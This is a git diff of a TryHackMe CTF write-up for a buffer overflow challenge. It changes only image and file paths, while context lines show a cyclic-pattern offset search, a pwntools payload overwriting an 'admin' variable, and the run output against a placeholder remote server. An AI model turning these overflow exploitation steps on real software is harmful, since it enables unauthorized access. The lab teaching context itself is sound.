@@ -123,7 +123,7 @@ aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa
 
 And we will paste the above string into the program, we can see the `admin` variable is being overwritten
 
-![image.png](TryOverflowMe2/image.png)
+![image.png](images/image.png)
 
 Look up the pattern, we can find the offset 
 
@@ -178,7 +178,7 @@ We can then write a `pwntools` script to solve it locally and remotely.
 
 Upon executing in gdb mode, we can see that we now failed the jump not equal check, and we can reach the `read_flag` function.
 
-![image.png](TryOverflowMe2/image%201.png)
+![image.png](images/image%201.png)
 
 We can now get the flag in the remote server!
 
@@ -186,14 +186,14 @@ We can now get the flag in the remote server!
     
     ```python
     └─$ python admin_overwrite.py REMOTE <Server IP> <Port>
-    [*] '/home/kali/CTF/THM/Medium/TryPwnMe One/Source/materials-TryPwnMeOne/TryOverFlowMe2/overflowme2'
+    [*] '/home/kali/CTF/THM/Medium/TryPwnMe One/Source/materials-TryPwnMeOne/images/overflowme2'
         Arch:       amd64-64-little
         RELRO:      Partial RELRO
         Stack:      No canary found
         NX:         NX enabled
         PIE:        No PIE (0x400000)
         Stripped:   No
-    /home/kali/CTF/THM/Medium/TryPwnMe One/Source/materials-TryPwnMeOne/TryOverFlowMe2/admin_overwrite.py:27: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+    /home/kali/CTF/THM/Medium/TryPwnMe One/Source/materials-TryPwnMeOne/images/admin_overwrite.py:27: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
       payload = flat({padding:admin})
     [+] Opening connection to <Server IP> on port <Port>: Done
     [DEBUG] Received 0x1f4 bytes:
